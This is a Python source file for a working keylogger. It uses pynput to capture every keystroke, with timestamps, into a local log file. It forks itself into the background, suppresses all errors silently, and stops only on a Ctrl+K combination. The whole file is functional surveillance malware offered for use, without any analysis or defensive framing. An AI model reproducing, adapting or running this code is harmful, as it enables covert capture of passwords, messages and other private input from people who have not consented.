from pynput import keyboard
from datetime import datetime
import os
import threading
import signal
import sys
import subprocess

class Keylogger:
    def __init__(self, filename: str = "keylog.txt"):
        self.filename = filename
        self.special_keys = {
            keyboard.Key.enter: '[ENTER]\n',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.space: ' ',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.ctrl_l: '[CTRL]',
            keyboard.Key.ctrl_r: '[CTRL]',
            keyboard.Key.alt_l: '[ALT]',
            keyboard.Key.caps_lock: '[CAPS_LOCK]'
        }
        # Track the state of Ctrl key
        self.ctrl_pressed = False
        self.listener = None
        self.running = True
    
    def get_timestamp(self):
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    def on_press(self, key):
        try:
            # Check for Ctrl key
            if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
                self.ctrl_pressed = True
                return

            # Check for Ctrl + K combination
            if self.ctrl_pressed and hasattr(key, 'char') and key.char == 'k':
                self.running = False
                if self.listener:
                    self.listener.stop()
                return False

            # Get the current timestamp
            timestamp = self.get_timestamp()
            
            # Open the log file in append mode
            with open(self.filename, 'a') as f:
                if hasattr(key, 'char'):  # Regular character
                    f.write(f'{timestamp}: {key.char}\n')
                else:  # Special key
                    key_str = self.special_keys.get(key, f'[{str(key)}]')
                    f.write(f'{timestamp}: {key_str}\n')
                
        except Exception as e:
            # Silent exception handling
            pass

    def on_release(self, key):
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self.ctrl_pressed = False

    def start_logging(self):
        # Create the log file if it doesn't exist
        if not os.path.exists(self.filename):
            with open(self.filename, 'w') as f:
                f.write(f"=== Keylogger Started at {self.get_timestamp()} ===\n")
        
        # Start the keyboard listener
        self.listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self.listener.start()
        self.listener.join()  # Keep the thread alive

    def start(self):
        # Handle Ctrl+C gracefully
        def signal_handler(sig, frame):
            self.running = False
            if self.listener:
                self.listener.stop()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start logging in a separate thread
        logging_thread = threading.Thread(target=self.start_logging)
        logging_thread.daemon = True  # Make the thread a daemon so it exits when the main program exits
        logging_thread.start()
        
        # Keep the main thread alive but not consuming CPU
        try:
            while self.running:
                logging_thread.join(0.1)  # Check every 0.1 seconds if we should stop
        except KeyboardInterrupt:
            pass
        finally:
            if self.listener:
                self.listener.stop()

if __name__ == "__main__":
    # Start the keylogger silently
    keylogger = Keylogger()
    
    # Detach from terminal
    try:
        # Fork the process
        pid = os.fork()
        if pid > 0:
            # Exit the parent process
            print("Keylogger is running in the background. Press Ctrl+K to stop.")
            sys.exit(0)
    except OSError:
        # If forking fails, continue in foreground
        pass
    
    # Start the keylogger
    keylogger.start() 